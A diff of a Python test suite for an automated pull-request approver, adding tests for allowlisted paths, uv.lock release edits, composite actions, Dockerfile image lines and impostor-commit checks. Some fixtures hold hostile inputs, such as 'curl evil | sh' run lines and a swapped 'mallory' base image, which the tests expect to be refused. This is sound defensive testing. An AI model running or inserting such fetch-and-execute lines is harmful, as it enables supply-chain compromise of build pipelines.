@@ -28,8 +28,10 @@ class FakeApi:
         self.fx = fx
 
     def repo(self, full_name: str) -> dict[str, Any]:
-        assert full_name == self.fx["target"], full_name
-        return self.fx["target_repo"]
+        if full_name == self.fx["target"]:
+            return self.fx["target_repo"]
+        assert full_name in self.fx["org_repos"], full_name
+        return self.fx["org_repos"][full_name]
 
     def repo_by_id(self, repo_id: int) -> dict[str, Any]:
         assert repo_id == self.fx["head_repo"]["id"], repo_id
@@ -44,6 +46,20 @@ class FakeApi:
 
     def pull_files(self, full_name: str, number: int) -> list[dict[str, Any]]:
         return self.fx["files"]
+
+    def compare_status(self, full_name: str, base: str, head: str) -> str:
+        return compare(self.fx["compares"], full_name, base, head)
+
+
+NOT_FOUND = 404  # a compares value meaning GitHub answered 404 (no common history)
+
+
+def compare(compares: dict[str, Any], full_name: str, base: str, head: str) -> str:
+    key = f"{full_name} {base}...{head}"
+    assert key in compares, f"unexpected compare: {key}"
+    if compares[key] == NOT_FOUND:
+        raise abr.GhError(f"gh api repos/{full_name}/compare/{base}...{head}: Not Found (HTTP 404)")
+    return compares[key]
 
 
 def decide(fx: dict[str, Any]) -> abr.Decision:
@@ -153,9 +169,12 @@ class AllowlistTest(unittest.TestCase):
         ok = [".github/workflows/ci.yml", ".github/workflows/a.yaml", "pyproject.toml", "uv.lock",
               "package.json", "package-lock.json", "boot/dev.boot.json", "x.boot.json",
               "tap-plugin.toml", "pkg/tap-plugin.toml", "CHANGELOG.md", ".release-please-manifest.json",
-              "release-please-config.json", ".env", "Dockerfile", "renovate.json5"]
-        bad = ["scripts/evil.sh", ".github/workflows/x/ci.yml", ".github/actions/a/action.yml",
-               "sub/pyproject.toml", "docker/Dockerfile", ".envrc", "uv.lock.bak", "src/CHANGELOG.md"]
+              "release-please-config.json", ".env", "Dockerfile", "renovate.json5",
+              ".github/actions/a/action.yml", "docker/postgres/Dockerfile"]
+        bad = ["scripts/evil.sh", ".github/workflows/x/ci.yml", ".github/actions/a/b/action.yml",
+               ".github/actions/action.yml", ".github/actions/a/action.yaml", ".github/actions/a/run.sh",
+               "sub/pyproject.toml", "docker/Dockerfile", "docker/postgres/Dockerfile.bak",
+               "docker/web/Dockerfile", ".envrc", "uv.lock.bak", "src/CHANGELOG.md"]
         for p in ok:
             self.assertTrue(abr.path_allowed(p), p)
         for p in bad:
@@ -236,8 +255,28 @@ class RealShapesTest(unittest.TestCase):
             with self.subTest(name):
                 self.assertIsNone(check(case(name)))
 
-    def test_real_release_pr_with_uv_lock_needs_a_human(self) -> None:
-        self.assertEqual(check(case("release_tap")), "needs a human look: uv.lock")
+    def test_real_release_prs_with_uv_lock_pass(self) -> None:
+        for name in ("release_tap", "release_tap760", "release_tap679", "release_tap344", "release_tap50", "release_tap38"):
+            with self.subTest(name):
+                self.assertIn("uv.lock", [f["filename"] for f in case(name)])
+                self.assertIsNone(check(case(name)))
+
+    def test_real_postgres_dockerfile_prs_pass(self) -> None:
+        names = [n for n in PATCHES if n.startswith("postgres_dockerfile_")]
+        self.assertEqual(len(names), 15)
+        for name in names:
+            with self.subTest(name):
+                self.assertIn("docker/postgres/Dockerfile", [f["filename"] for f in case(name)])
+                self.assertIsNone(check(case(name)))
+
+    def test_real_composite_action_prs_pass(self) -> None:
+        names = [n for n in PATCHES if n.startswith("action_yml_")]
+        self.assertEqual(len(names), 3)
+        for name in names:
+            with self.subTest(name):
+                self.assertIn(".github/actions/ci-web-image/action.yml", [f["filename"] for f in case(name)])
+                self.assertIsNone(check(case(name)))
+                self.assertEqual(abr.org_pins(case(name)), [])  # third-party actions only
 
     def test_real_release_pr_without_uv_lock_passes(self) -> None:
         files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
@@ -412,11 +451,85 @@ class HostileContentTest(unittest.TestCase):
         files = one_file("tap_plugin/x/tap-plugin.toml", '@@ -3,1 +3,1 @@\n-requires_tap = ">=0.2.1"\n+requires_tap = ">=0.0.0"\n')
         self.assertRefused(files, "`requires_tap` changes")
 
-    def test_plugin_manifest_sha256_refresh(self) -> None:
+    def test_plugin_manifest_sha256_with_its_boot_record(self) -> None:
         # Shape of duo-tap's [[boot.records]] digest line; no bot PR has changed one yet.
-        patch = '@@ -55,1 +55,1 @@\n-sha256 = "' + "b" * 64 + '"\n+sha256 = "' + "c" * 64 + '"\n'
-        self.assertIsNone(check(one_file("tap_plugin/duo/tap-plugin.toml", patch)))
-        self.assertRefused(one_file("tap_plugin/duo/tap-plugin.toml", patch.replace("c" * 64, "c" * 63)), "not 64 hex")
+        files = one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH) + one_file("tap_plugin/duo/boot/ci.boot.json", DUO_BOOT_PATCH)
+        self.assertIsNone(check(files))
+        files[0]["patch"] = SHA256_PATCH.replace("c" * 64, "c" * 63)
+        self.assertRefused(files, "not 64 hex")
+
+    def test_plugin_manifest_lone_sha256_refused(self) -> None:
+        self.assertRefused(one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH), "no boot record changed in the same")
+
+    def test_plugin_manifest_sha256_with_another_packages_boot_record(self) -> None:
+        files = one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH) + one_file("tap_plugin/okta/boot/ci.boot.json", DUO_BOOT_PATCH)
+        self.assertRefused(files, "no boot record changed in the same")
+        files = one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH) + one_file("boot/ci.boot.json", DUO_BOOT_PATCH)
+        self.assertRefused(files, "no boot record changed in the same")
+        # A manifest outside any tap_plugin/<slug>/ package has no package to match.
+        files = one_file("tap-plugin.toml", SHA256_PATCH) + one_file("boot/ci.boot.json", DUO_BOOT_PATCH)
+        self.assertRefused(files, "no boot record changed in the same")
+
+    def test_added_composite_action(self) -> None:
+        files = one_file(".github/actions/x/action.yml", "@@ -0,0 +1,1 @@\n+runs: {using: composite}\n", status="added")
+        self.assertRefused(files, "adds a composite action")
+        files = case("action_yml_tap488")
+        patch_of(files, ".github/actions/ci-web-image/action.yml")["status"] = "added"
+        self.assertRefused(files, "adds a composite action")
+
+    def test_composite_action_run_line(self) -> None:
+        files = edit(case("action_yml_tap488"), ".github/actions/ci-web-image/action.yml",
+                     "       if: steps.decide.outputs.mode == 'build'\n-      uses:",
+                     "       if: steps.decide.outputs.mode == 'build'\n+      run: curl evil | sh\n-      uses:")
+        self.assertRefused(files, "removed and added lines interleave")
+        files = one_file(".github/actions/ci-web-image/action.yml", "@@ -40,1 +40,1 @@\n-      run: make\n+      run: curl evil | sh\n")
+        self.assertRefused(files, "not a `uses:` line")
+
+    def test_postgres_dockerfile_run_change(self) -> None:
+        files = one_file("docker/postgres/Dockerfile", "@@ -10,3 +10,3 @@\n FROM x AS y\n-RUN apk add curl\n+RUN curl evil | sh\n")
+        self.assertRefused(files, "not a `FROM` or `COPY --from=` image line")
+        files = edit(case("postgres_dockerfile_tap837"), "docker/postgres/Dockerfile",
+                     "+FROM cgr.dev/chainguard/wolfi-base:latest@", "+FROM docker.io/mallory/wolfi-base:latest@")
+        self.assertRefused(files, "changes its image, stage name or arguments")
+
+    # uv.lock: only tap's own version line, in a release PR, to the manifest's version.
+
+    def test_uv_lock_second_changed_line(self) -> None:
+        files = edit(case("release_tap760"), "uv.lock", ' dependencies = [\n     { name = "croniter" },',
+                     ' dependencies = [\n-    { name = "croniter" },\n+    { name = "evil" },')
+        self.assertRefused(files, "needs a human look: uv.lock (not one version line)")
+
+    def test_uv_lock_second_hunk(self) -> None:
+        files = case("release_tap760")
+        f = patch_of(files, "uv.lock")
+        f["patch"] += '\n@@ -2000,1 +2000,1 @@\n-version = "1.0.0"\n+version = "0.2.2"'
+        self.assertRefused(files, "needs a human look: uv.lock (not one version line)")
+
+    def test_uv_lock_other_package(self) -> None:
+        files = edit(case("release_tap760"), "uv.lock", ' name = "tap"\n', ' name = "croniter"\n')
+        self.assertRefused(files, "not the project's own package")
+
+    def test_uv_lock_not_virtual_source(self) -> None:
+        files = edit(case("release_tap760"), "uv.lock", ' source = { virtual = "." }',
+                     ' source = { registry = "https://pypi.org/simple" }')
+        self.assertRefused(files, "virtual")
+
+    def test_uv_lock_version_not_the_manifests(self) -> None:
+        files = edit(case("release_tap760"), "uv.lock", '+version = "0.2.2"', '+version = "0.2.3"')
+        self.assertRefused(files, "does not match the release manifest")
+
+    def test_uv_lock_block_not_visible(self) -> None:
+        files = edit(case("release_tap760"), "uv.lock", " \n [[package]]\n", " \n")
+        self.assertRefused(files, "`[[package]]` block is not visible")
+
+    def test_uv_lock_project_name_not_visible(self) -> None:
+        files = edit(case("release_tap760"), "pyproject.toml", ' name = "tap"\n', ' description = "x"\n')
+        self.assertRefused(files, "project name is not visible")
+
+    def test_uv_lock_changed_line_not_a_version(self) -> None:
+        files = edit(case("release_tap760"), "uv.lock", '-version = "0.2.1"\n+version = "0.2.2"',
+                     '-version = "0.2.1"\n+version = "0.2.2" # x')
+        self.assertRefused(files, "the changed line is not a `version`")
 
     def test_pyproject_dependency_renamed(self) -> None:
         files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "rufff>=0.16,<0.17",')
@@ -430,6 +543,10 @@ class HostileContentTest(unittest.TestCase):
         files = [patch_of(case("release_tap"), "pyproject.toml")]
         self.assertRefused(files, "outside a release-please PR")
 
+    def test_uv_lock_outside_a_release_pr(self) -> None:
+        files = [patch_of(case("release_tap760"), "uv.lock")]
+        self.assertRefused(files, "needs a human look: uv.lock")
+
     def test_whole_decision_refuses_hostile_workflow(self) -> None:
         fx = copy.deepcopy(FIXTURE)
         fx["files"] = edit(fx["files"], ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}\n",
@@ -437,6 +554,161 @@ class HostileContentTest(unittest.TestCase):
         d = decide(fx)
         self.assertFalse(d.approve)
         self.assertIn(".github/workflows/ci.yml", d.reason)
+
+
+SHA256_PATCH = '@@ -55,1 +55,1 @@\n-sha256 = "' + "b" * 64 + '"\n+sha256 = "' + "c" * 64 + '"\n'
+# duo-tap's ci.boot.json entry for identity_core, its `commit` moved (the shape of the real
+# boot-record moves in RealShapesTest.boot_commit).
+DUO_BOOT_PATCH = (
+    '@@ -9,7 +9,7 @@\n         "source": {\n           "type": "git",\n'
+    '           "url": "https://github.com/unified-systems-com/tap-plugin-identity-core",\n'
+    '-          "commit": "53da388b6f47590090ef3bdc8d98731acff4c8e2"\n'
+    '+          "commit": "63da037c77355369f91748127a74c7a17e00a7f9"\n'
+    '         },\n'
+)
+
+COMPLIANCE = "unified-systems-com/tap-plugin-compliance-core"
+GITHUB_CORE = "unified-systems-com/tap-plugin-github-core"
+# tap#647's two boot-record commits (both release tags' commits; live compare `ahead`, 2026-09-27).
+COMPLIANCE_SHA = "e5464e4dd87758d41552d45df42c0303b0de48e3"
+GITHUB_CORE_SHA = "d157f3f1d457b44dbb44d46c5944578d3f221a1b"
+
+
+class PinApi:
+    """Serves repos/{repo} (default branch main) and the compares it is given; any other
+    request fails the test."""
+
+    def __init__(self, compares: dict[str, Any], repos: dict[str, dict[str, Any]] | None = None):
+        self.compares, self.repos, self.calls = compares, repos or {}, []
+
+    def repo(self, full_name: str) -> dict[str, Any]:
+        self.calls.append(("repo", full_name))
+        if full_name in self.repos:
+            if isinstance(self.repos[full_name], Exception):
+                raise self.repos[full_name]
+            return self.repos[full_name]
+        return {"full_name": full_name, "default_branch": "main"}
+
+    def compare_status(self, full_name: str, base: str, head: str) -> str:
+        self.calls.append(("compare", full_name, base, head))
+        return compare(self.compares, full_name, base, head)
+
+
+def boot_compares(compliance: Any = "ahead", github_core: Any = "ahead") -> dict[str, Any]:
+    return {f"{COMPLIANCE} {COMPLIANCE_SHA}...main": compliance, f"{GITHUB_CORE} {GITHUB_CORE_SHA}...main": github_core}
+
+
+class ImpostorCommitTest(unittest.TestCase):
+    """Every sha the PR pins in one of our repositories must be on its default branch."""
+
+    def setUp(self) -> None:
+        self.fx = copy.deepcopy(FIXTURE)
+        self.key = "unified-systems-com/tap 57505751b27900e5d58fc0c2b40df32f18a2b980...main"
+
+    def test_reachable_uses_sha_approves(self) -> None:
+        for status in ("ahead", "identical"):
+            with self.subTest(status):
+                self.fx["compares"][self.key] = status
+                self.assertTrue(decide(self.fx).approve)
+
+    def test_impostor_uses_sha_refused(self) -> None:
+        for status, fragment in (("diverged", "compare says diverged"), ("behind", "compare says behind"),
+                                 (NOT_FOUND, "could not verify")):
+            with self.subTest(status):
+                self.fx["compares"][self.key] = status
+                d = decide(self.fx)
+                self.assertFalse(d.approve)
+                self.assertIn(fragment, d.reason)
+                self.assertIn("unified-systems-com/tap@57505751b279", d.reason)
+
+    def test_uses_owner_in_other_case_still_checked(self) -> None:
+        files = case("workflow_sha_bump")
+        for f in files:
+            f["patch"] = f["patch"].replace("unified-systems-com/tap/", "Unified-Systems-Com/tap/")
+        self.assertIsNone(check(files))
+        self.assertIn("compare says diverged", abr.check_pins(files, PinApi({f"unified-systems-com/tap {NEW_SHA}...main": "diverged"})) or "")
+
+    def test_repo_lookup_error_refused(self) -> None:
+        api = PinApi({}, {"unified-systems-com/tap": abr.GhError("HTTP 502")})
+        self.assertIn("could not verify", abr.check_pins(case("workflow_sha_bump"), api) or "")
+
+    def test_unreadable_default_branch_refused(self) -> None:
+        for branch in ("", "../x", "a b"):
+            with self.subTest(branch):
+                api = PinApi({}, {"unified-systems-com/tap": {"default_branch": branch}})
+                self.assertIn("default branch is unreadable", abr.check_pins(case("workflow_sha_bump"), api) or "")
+
+    def test_third_party_uses_not_checked(self) -> None:
+        api = PinApi({})
+        self.assertIsNone(abr.check_pins(case("workflow_version_comment"), api))
+        self.assertEqual(api.calls, [])
+
+    def test_real_boot_commits_reachable(self) -> None:
+        files = case("boot_commit")
+        self.assertIsNone(check(files))
+        self.assertEqual(sorted(set(abr.org_pins(files))), sorted({
+            ("tap-plugin-compliance-core", COMPLIANCE_SHA, "boot/core_ci.boot.json"),
+            ("tap-plugin-github-core", GITHUB_CORE_SHA, "boot/core_ci.boot.json"),
+            ("tap-plugin-compliance-core", COMPLIANCE_SHA, "boot/test_all.boot.json"),
+            ("tap-plugin-github-core", GITHUB_CORE_SHA, "boot/test_all.boot.json"),
+        }))
+        api = PinApi(boot_compares())
+        self.assertIsNone(abr.check_pins(files, api))
+        self.assertEqual(sum(1 for c in api.calls if c[0] == "compare"), 4)
+        self.assertIsNone(abr.check_pins(files, PinApi(boot_compares(github_core="identical"))))
+
+    def test_impostor_boot_commit_refused(self) -> None:
+        for status, fragment in (("diverged", "compare says diverged"), ("behind", "compare says behind"),
+                                 (NOT_FOUND, "could not verify")):
+            with self.subTest(status):
+                why = abr.check_pins(case("boot_commit"), PinApi(boot_compares(github_core=status)))
+                self.assertIn(fragment, why or "")
+                self.assertIn("tap-plugin-github-core@d157f3f1d457", why or "")
+
+    def test_boot_commit_url_not_in_diff_refused(self) -> None:
+        url = '          "url": "https://github.com/unified-systems-com/tap-plugin-compliance-core",\n'
+        files = edit(case("boot_commit"), "boot/core_ci.boot.json", " " + url, "")
+        self.assertIn("does not show its entry's `url`", abr.check_pins(files, PinApi(boot_compares())) or "")
+
+    def test_boot_commit_url_of_another_entry_not_used(self) -> None:
+        # The url line sits in the object above, not this one: not this entry's url.
+        patch = ('@@ -5,6 +5,6 @@\n       "url": "https://github.com/unified-systems-com/tap"\n     },\n     "source": {\n'
+                 '       "type": "git",\n-      "commit": "' + OLD_SHA + '"\n+      "commit": "' + NEW_SHA + '"\n')
+        files = one_file("boot/x.boot.json", patch)
+        self.assertIsNone(check(files))
+        self.assertIn("does not show its entry's `url`", abr.check_pins(files, PinApi({})) or "")
+
+    def test_boot_commit_odd_url_of_ours_refused(self) -> None:
+        files = edit(case("boot_commit"), "boot/core_ci.boot.json", "unified-systems-com/tap-plugin-compliance-core\"",
+                     "unified-systems-com/tap-plugin-compliance-core/tree/main\"")
+        self.assertIn("not a plain repository URL", abr.check_pins(files, PinApi(boot_compares())) or "")
+
+    def test_boot_commit_of_a_third_party_not_checked(self) -> None:
+        files = case("boot_commit")
+        for f in files:
+            f["patch"] = f["patch"].replace("github.com/unified-systems-com/", "github.com/someone-else/")
+        api = PinApi({})
+        self.assertIsNone(abr.check_pins(files, api))
+        self.assertEqual(api.calls, [])
+
+    def test_boot_rev_that_is_a_sha_checked(self) -> None:
+        patch = DUO_BOOT_PATCH.replace('"commit"', '"rev"')
+        files = one_file("tap_plugin/duo/boot/ci.boot.json", patch)
+        self.assertIsNone(check(files))
+        key = "unified-systems-com/tap-plugin-identity-core 63da037c77355369f91748127a74c7a17e00a7f9...main"
+        self.assertIsNone(abr.check_pins(files, PinApi({key: "ahead"})))
+        self.assertIn("compare says diverged", abr.check_pins(files, PinApi({key: "diverged"})) or "")
+
+    def test_whole_decision_refuses_impostor_boot_commit(self) -> None:
+        self.fx["files"] = case("boot_commit")
+        self.fx["pulls"][0]["changed_files"] = 2
+        self.fx["org_repos"] = {r: {"full_name": r, "default_branch": "main"} for r in (COMPLIANCE, GITHUB_CORE)}
+        self.fx["compares"] = boot_compares()
+        self.assertTrue(decide(self.fx).approve)
+        self.fx["compares"] = boot_compares(compliance="diverged")
+        d = decide(self.fx)
+        self.assertFalse(d.approve)
+        self.assertIn("possible impostor commit", d.reason)
 
 
 if __name__ == "__main__":
